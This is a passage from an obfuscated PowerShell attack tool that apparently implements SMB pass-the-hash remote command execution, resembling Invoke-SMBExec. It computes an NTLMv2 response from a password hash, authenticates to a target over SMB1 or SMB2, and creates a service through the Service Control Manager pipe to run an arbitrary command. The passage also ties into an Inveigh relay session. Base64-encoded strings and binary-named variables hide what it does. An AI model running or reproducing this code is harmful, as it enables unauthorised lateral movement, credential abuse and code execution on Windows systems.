                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAdABhAHIAZwBlAHQA')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                ${00100000101110000} = $false
                                ${01111000010110111} = 0x00,0x00
                                ${01111011110001111} = 0x05,0x80,0x08,0xa0
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                    {
                        if(${00110011011100110} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
                        {
                            ${10110100100110010} = _10110010011100000 0x73 0x18 0x07,0xc8 0xff,0xff ${01100101101011101} 0x00,0x00
                            if(${00100000101110000})
                            {
                                ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            }
                            ${10010011111101110} = _00010111111111111 ${01111011110001111}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                            ${01111001011101101} = _01011001101010110 ${10010011111101110}       
                            ${00111111110011001} = _01111000110101110 ${01111001011101101}
                            ${10111010001111001} = _01011001101010110 ${00111111110011001}
                            ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
                        }
                        else
                        {
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x01,0x00 0x1f,0x00 $false ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            ${10010011111101110} = _00010111111111111 ${01111011110001111}
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111001011101101} = _01011001101010110 ${10010011111101110}       
                            ${01110101111101001} = _00000111000110001 ${01111001011101101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100}
                        }
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()    
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                    }
                }
            }
            catch
            {
                echo "[-] $($_.Exception.Message)"
                ${10011011111011001} = $true
            }
        }
        if(!${00111111001101100} -and !${10011011111011001})
        {
            ${00011101011001011} = [System.BitConverter]::ToString(${00111000010101001})
            ${00011101011001011} = ${00011101011001011} -replace "-",""
            ${10001101101100011} = ${00011101011001011}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
            ${00110001101101100} = ${10001101101100011} / 2
            ${00011110100111001} = _10111000101010101 (${00110001101101100} + 12) ${00111000010101001}
            ${10000001110110101} = _10111000101010101 (${00110001101101100} + 40) ${00111000010101001}
            ${10110101111010011} = ${00111000010101001}[44..51]
            ${01101101110000111} = ${00111000010101001}[(${00110001101101100} + 24)..(${00110001101101100} + 31)]
            ${10100100100010101} = ${00111000010101001}[(${00110001101101100} + 56 + ${00011110100111001})..(${00110001101101100} + 55 + ${00011110100111001} + ${10000001110110101})]
            ${00011001000100110} = ${10100100100010101}[(${10100100100010101}.Length - 12)..(${10100100100010101}.Length - 5)]
            ${01111011010001101} = (&{for (${00011010100110000} = 0;${00011010100110000} -lt $hash.Length;${00011010100110000} += 2){$hash.SubString(${00011010100110000},2)}}) -join "-"
            ${01111011010001101} = ${01111011010001101}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${10010011101101011} = (ls -path env:computername).Value
            ${10100100010101001} = [System.Text.Encoding]::Unicode.GetBytes(${10010011101101011})
            ${11000000001110101} = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            ${01100111110011101} = [System.Text.Encoding]::Unicode.GetBytes($username)
            ${01111100000010011} = [System.BitConverter]::GetBytes(${11000000001110101}.Length)[0,1]
            ${01111100000010011} = [System.BitConverter]::GetBytes(${11000000001110101}.Length)[0,1]
            ${01010110010000100} = [System.BitConverter]::GetBytes(${01100111110011101}.Length)[0,1]
            ${01101011101111010} = [System.BitConverter]::GetBytes(${10100100010101001}.Length)[0,1]
            ${01100001000010001} = 0x40,0x00,0x00,0x00
            ${10101001101100100} = [System.BitConverter]::GetBytes(${11000000001110101}.Length + 64)
            ${10100100111000010} = [System.BitConverter]::GetBytes(${11000000001110101}.Length + ${01100111110011101}.Length + 64)
            ${10011110100100110} = [System.BitConverter]::GetBytes(${11000000001110101}.Length + ${01100111110011101}.Length + ${10100100010101001}.Length + 64)
            ${00101101101010011} = [System.BitConverter]::GetBytes(${11000000001110101}.Length + ${01100111110011101}.Length + ${10100100010101001}.Length + 88)
            ${00110101011100100} = New-Object System.Security.Cryptography.HMACMD5
            ${00110101011100100}.key = ${01111011010001101}
            ${01011110111000010} = $username.ToUpper()
            ${10110000001011010} = [System.Text.Encoding]::Unicode.GetBytes(${01011110111000010})
            ${10110000001011010} += ${11000000001110101}
            ${10010001101101101} = ${00110101011100100}.ComputeHash(${10110000001011010})
            ${01101011010100110} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${10001011001110001} = ${01101011010100110}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${00000110100111011} = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    ${00011001000100110} +
                                    ${10001011001110001} +
                                    0x00,0x00,0x00,0x00 +
                                    ${10100100100010101} +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00
            ${10111111010101110} = ${01101101110000111} + ${00000110100111011}
            ${00110101011100100}.key = ${10010001101101101}
            ${01011000000110110} = ${00110101011100100}.ComputeHash(${10111111010101110})
            if(${00100000101110000})
            {
                ${01000001101000101} = ${00110101011100100}.ComputeHash(${01011000000110110})
                ${01010101101000111} = ${01000001101000101}
                ${00010011111110011} = New-Object System.Security.Cryptography.HMACSHA256
                ${00010011111110011}.key = ${01010101101000111}
            }
            ${01011000000110110} = ${01011000000110110} + ${00000110100111011}
            ${10000010111111011} = [System.BitConverter]::GetBytes(${01011000000110110}.Length)[0,1]
            ${10001000110110101} = [System.BitConverter]::GetBytes(${11000000001110101}.Length + ${01100111110011101}.Length + ${10100100010101001}.Length + ${01011000000110110}.Length + 88)
            ${00111111101010110} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    ${10011110100100110} +
                                    ${10000010111111011} +
                                    ${10000010111111011} +
                                    ${00101101101010011} +
                                    ${01111100000010011} +
                                    ${01111100000010011} +
                                    ${01100001000010001} +
                                    ${01010110010000100} +
                                    ${01010110010000100} +
                                    ${10101001101100100} +
                                    ${01101011101111010} +
                                    ${01101011101111010} +
                                    ${10100100111000010} +
                                    ${01111000010110111} +
                                    ${01111000010110111} +
                                    ${10001000110110101} +
                                    ${01111011110001111} +
                                    ${11000000001110101} +
                                    ${01100111110011101} +
                                    ${10100100010101001} +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    ${01011000000110110}
            if(${00110011011100110} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
            {
                ${01101110110001111} = ${00111000010101001}[32,33]
                ${10110100100110010} = _10110010011100000 0x73 0x18 0x07,0xc8 0xff,0xff ${01100101101011101} ${01101110110001111}
                if(${00100000101110000})
                {
                    ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                }
                ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAEQA')))] = ${01101110110001111}
                ${10010011111101110} = _10011110011101011 ${00111111101010110}
                ${00110110111000000} = _01011001101010110 ${10110100100110010}
                ${01111001011101101} = _01011001101010110 ${10010011111101110}      
                ${00111111110011001} = _01111000110101110 ${01111001011101101}
                ${10111010001111001} = _01011001101010110 ${00111111110011001}
                ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                ${01001111000111011} = _01011001101010110 ${00011110010101001}
                ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
            }
            else
            {
                ${00101000011001000}++
                ${00111111111000101} = _00110110101000101 0x01,0x00 0x01,0x00 $false ${00101000011001000}  ${01100101101011101} ${10110001011111111} ${10110101111010011}
                ${01101101110101110} = _10011110011101011 ${00111111101010110}
                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                ${00100110010101101} = _01011001101010110 ${01101101110101110}        
                ${01110101111101001} = _00000111000110001 ${00100110010101101}
                ${01111101001100100} = _01011001101010110 ${01110101111101001}
                ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                ${01001111000111011} = _01011001101010110 ${00011110010101001}
                ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100}
            }
            try
            {
                ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                ${01110010010100001}.Flush()
                ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                if(${00110011011100110} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
                {
                    if([System.BitConverter]::ToString(${00111000010101001}[9..12]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                    {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMQAwADEAMQAwADAAMAAwADEAMAAwADAAMQAxADAAMAAxAH0AIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                        ${00111011010000000} = $true
                    }
                    else
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAAkAHsAMQAwADEAMQAwADAAMAAwADEAMAAwADAAMQAxADAAMAAxAH0AIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAbwBuACAAJABUAGEAcgBnAGUAdAA=')))
                        ${00111011010000000} = $false
                    }
                }
                else
                {
                    if([System.BitConverter]::ToString(${00111000010101001}[12..15]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                    {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMQAwADEAMQAwADAAMAAwADEAMAAwADAAMQAxADAAMAAxAH0AIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                        ${00111011010000000} = $true
                    }
                    else
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAAkAHsAMQAwADEAMQAwADAAMAAwADEAMAAwADAAMQAxADAAMAAxAH0AIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAbwBuACAAJABUAGEAcgBnAGUAdAA=')))
                        ${00111011010000000} = $false
                    }
                }
            }
            catch
            {
                echo "[-] $($_.Exception.Message)"
            }
        }
    }
    if(${00111011010000000} -or ${10011100100001011})
    {
        if(${10011100100001011})
        {
            if(${10011100100001011} -and $inveigh.session_lock_table[$session] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBlAGQA'))))
            {
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAdQBzAGkAbgBnACAAZAB1AGUAIAB0AG8AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAGwAbwBjAGsA')))
                sleep -s 2
            }
            $inveigh.session_lock_table[$session] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBlAGQA')))
            ${00001110111101110} = $inveigh.session_socket_table[$session]
            ${01110010010100001} = ${00001110111101110}.GetStream()
            ${10110101111010011} = $inveigh.session_table[$session]
            ${00101000011001000} =  $inveigh.session_message_ID_table[$session]
            ${10110001011111111} = 0x00,0x00,0x00,0x00
            ${00100000101110000} = $false
        }
        ${01011110001011100} = "\\" + $Target + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAFAAQwAkAA==')))
        if(${00110011011100110} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
        {
            ${10111110011101001} = [System.Text.Encoding]::UTF8.GetBytes(${01011110001011100}) + 0x00
        }
        else
        {
            ${10111110011101001} = [System.Text.Encoding]::Unicode.GetBytes(${01011110001011100})
        }
        ${00111100100000110} = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03
        if(!$Service)
        {
            ${10101100100010110} = [String]::Join($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0A'))),(1..20 | %{$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQA='))) -f (Get-Random -Minimum 65 -Maximum 90)}))
            ${10110111001010111} = ${10101100100010110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
            ${10110111001010111} = ${10110111001010111}.Substring(0,${10110111001010111}.Length - 1)
            ${10110111001010111} = ${10110111001010111}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${10110111001010111} = New-Object System.String (${10110111001010111},0,${10110111001010111}.Length)
            ${10101100100010110} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))
            ${10110011011000011} = ${10101100100010110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            ${10110111001010111} = $Service
            ${10110011011000011} = [System.Text.Encoding]::Unicode.GetBytes(${10110111001010111})
            if([Bool](${10110111001010111}.Length % 2))
            {
                ${10110011011000011} += 0x00,0x00
            }
            else
            {
                ${10110011011000011} += 0x00,0x00,0x00,0x00
            }
        }
        ${00011100101100110} = [System.BitConverter]::GetBytes(${10110111001010111}.Length + 1)
        if($CommandCOMSPEC -eq 'Y')
        {
            $Command = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBDAE8ATQBTAFAARQBDACUAIAAvAEMAIAAiAA=='))) + $Command + "`""
        }
        else
        {
            $Command = "`"" + $Command + "`""
        }
        [System.Text.Encoding]::UTF8.GetBytes($Command) | %{${01001011111001111} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQAwADAALQA='))) -f $_}
        if([Bool]($Command.Length % 2))
        {
            ${01001011111001111} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAA==')))
        }
        else
        {
            ${01001011111001111} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))
        }    
        ${00001101010111110} = ${01001011111001111}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}  
        ${01110010101010100} = [System.BitConverter]::GetBytes(${00001101010111110}.Length / 2)
        ${01001010101110100} = 4256
        if(${00110011011100110} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
        {
            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AEEAbgBkAFgAUgBlAHEAdQBlAHMAdAA=')))
            while (${10010010100101111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
            {
                switch (${10010010100101111})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAEEAYwBjAGUAcwBzAA==')))
                    {
                        if([System.BitConverter]::ToString(${00111000010101001}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))) -and [System.BitConverter]::ToString(${00111000010101001}[88..107]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${00100000001001011} = ${00111000010101001}[88..107]
                            if(${10011100111101000})
                            {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADEAMAAwADAAMAAxADAAMAAwADEAMQAwADAAMQB9ACAAaABhAHMAIABTAGUAcgB2AGkAYwBlACAAQwBvAG4AdAByAG8AbAAgAE0AYQBuAGEAZwBlAHIAIAB3AHIAaQB0AGUAIABwAHIAaQB2AGkAbABlAGcAZQAgAG8AbgAgACQAVABhAHIAZwBlAHQA')))  
                                ${00000010111100001} = _10001001111111011 ${00100000001001011} ${10110011011000011} ${00011100101100110} ${00001101010111110} ${01110010101010100}
                                ${00111010111111011} = _01011001101010110 ${00000010111100001}
                                if(${00111010111111011}.Length -lt ${01001010101110100})
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                                }
                                else
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ARgBpAHIAcwB0AA==')))
                                }
                            }
                            else
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADEAMAAwADAAMAAxADAAMAAwADEAMQAwADAAMQB9ACAAaABhAHMAIABTAGUAcgB2AGkAYwBlACAAQwBvAG4AdAByAG8AbAAgAE0AYQBuAGEAZwBlAHIAIAB3AHIAaQB0AGUAIABwAHIAaQB2AGkAbABlAGcAZQAgAG8AbgAgACQAVABhAHIAZwBlAHQA')))
                                ${01011000010100111} = 2
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                            }
                        }
                        elseif([System.BitConverter]::ToString(${00111000010101001}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAMQAwADEAMQAwADAAMAAwADEAMAAwADAAMQAxADAAMAAxAH0AIABkAG8AZQBzACAAbgBvAHQAIABoAGEAdgBlACAAUwBlAHIAdgBpAGMAZQAgAEMAbwBuAHQAcgBvAGwAIABNAGEAbgBhAGcAZQByACAAdwByAGkAdABlACAAcAByAGkAdgBpAGwAZQBnAGUAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                        }
                        else
                        {
                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAG8AbQBlAHQAaABpAG4AZwAgAHcAZQBuAHQAIAB3AHIAbwBuAGcAIAB3AGkAdABoACAAJABUAGEAcgBnAGUAdAA=')))
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    {
                        ${10110100100110010} = _10110010011100000 0x04 0x18 0x07,0xc8 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10110100011010101 0x00,0x40
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} 
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                    {
                        if(${01011000010100111} -eq 1)
                        {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgACQAewAxADAAMQAxADAAMQAxADEAMAAwADEAMAAxADAAMQAxADEAfQAgAGQAZQBsAGUAdABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                            ${01011000010100111}++
                            ${00000010111100001} = _10111000000001000 ${00001010011110110}
                        }
                        else
                        {
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            ${00000010111100001} = _10111000000001000 ${00100000001001011}
                        }
                        ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00111010111111011} = _01011001101010110 ${00000010111100001}
                        ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        ${01010111111111000} = _01011001101010110 ${00101001010010001}
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10001111011100101 ${10111010110010010} (${01010111111111000}.Length + ${00111010111111011}.Length)
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00110000011001000} = ${10111010001111001}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${00110000011001000}
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001} + ${01010111111111000} + ${00111010111111011}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQQBuAGQAWABSAGUAcQB1AGUAcwB0AA==')))
                    {
                        ${01001010000110001} = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 
                        ${11000001111000011} = ${00111000010101001}[28,29]
                        ${10110100100110010} = _10110010011100000 0xa2 0x18 0x02,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _10110100110011111 ${01001010000110001}
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} 
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                    {
                        ${10110100100110010} = _10110010011100000 0x2f 0x18 0x05,0x28 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00000010111100001} = _10001001111111011 ${00100000001001011} ${10110011011000011} ${00011100101100110} ${00001101010111110} ${01110010101010100}
                        ${00111010111111011} = _01011001101010110 ${00000010111100001}
